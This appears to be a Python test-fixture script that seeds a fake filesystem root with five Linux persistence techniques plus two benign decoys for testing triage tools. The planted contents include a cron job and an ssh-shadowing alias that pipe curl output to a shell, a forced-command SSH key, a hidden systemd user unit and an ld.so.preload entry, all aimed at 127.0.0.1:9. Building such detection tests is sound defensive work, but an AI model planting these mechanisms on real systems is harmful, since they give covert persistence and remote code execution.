#!/usr/bin/env python3
"""plants.py seed|remove|list [ROOT]  -- harmless persistence plants for testing triage (never executed, point to 127.0.0.1:9).
ROOT (required) is a fake filesystem root; nothing is written to the real /etc or /home.
Plants (5) + 2 benign decoys that must NOT be flagged:
  P1 etc/cron.d/sysupdate             cron line piping curl to sh
  P2 home/victim/.config/systemd/user/updater.service  user unit ExecStart in /tmp hidden dir
  P3 home/victim/.ssh/authorized_keys  key with forced command=
  P4 home/victim/.bashrc              alias shadowing ssh with a curl|bash wrapper
  P5 etc/ld.so.preload                 preload entry in /tmp
  D1 etc/cron.d/e2scrub, D2 benign alias in .bashrc (decoys)
"""
import os, shutil, subprocess, sys, tempfile
ROOT = sys.argv[2]  # required: a scratch directory used as a fake filesystem root
PLANTS = ["etc/cron.d/sysupdate", "home/victim/.config/systemd/user/updater.service",
          "home/victim/.ssh/authorized_keys", "home/victim/.bashrc", "etc/ld.so.preload"]

def w(p, t, mode=0o644):
    p = f"{ROOT}/{p}"; os.makedirs(os.path.dirname(p), exist_ok=True)
    open(p, "w").write(t); os.chmod(p, mode)

def seed():
    d = tempfile.mkdtemp(); k = f"{d}/k"
    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "lab-plant@test", "-f", k], check=True)
    pub = open(k + ".pub").read().strip(); shutil.rmtree(d)
    w("etc/cron.d/sysupdate", "# lab plant P1 (harmless, never executed)\n*/5 * * * * root curl -s http://127.0.0.1:9/x.sh | sh\n")
    w("etc/cron.d/e2scrub", "# benign decoy D1\n30 3 * * * root test -e /run/systemd/system || /usr/lib/e2fsprogs/e2scrub_all_cron\nMAILTO=root\n")
    w("home/victim/.config/systemd/user/updater.service",
      "[Unit]\nDescription=lab plant P2\n[Service]\nExecStart=/tmp/.hidden/updater --quiet\nRestart=always\n[Install]\nWantedBy=default.target\n")
    w("home/victim/.ssh/authorized_keys", f'command="/tmp/x.sh",no-pty {pub}\n', 0o600)
    w("home/victim/.bashrc", "# benign decoy D2\nalias ll='ls -l'\nexport PATH=$PATH:$HOME/bin\n# lab plant P4\nalias ssh='curl -s 127.0.0.1:9/p | bash; ssh'\n")
    w("etc/ld.so.preload", "# lab plant P5\n/tmp/libx.so\n")
    print("seeded", len(PLANTS), "plants + 2 decoys under", ROOT)

def remove():
    if os.path.isdir(ROOT): shutil.rmtree(ROOT)
    print("removed", ROOT, "exists_now=", os.path.exists(ROOT))

cmd = sys.argv[1] if len(sys.argv) > 1 else "list"
if cmd == "seed": seed()
elif cmd == "remove": remove()
else:
    for r, _, fs in os.walk(ROOT):
        for f in fs: print(os.path.join(r, f))
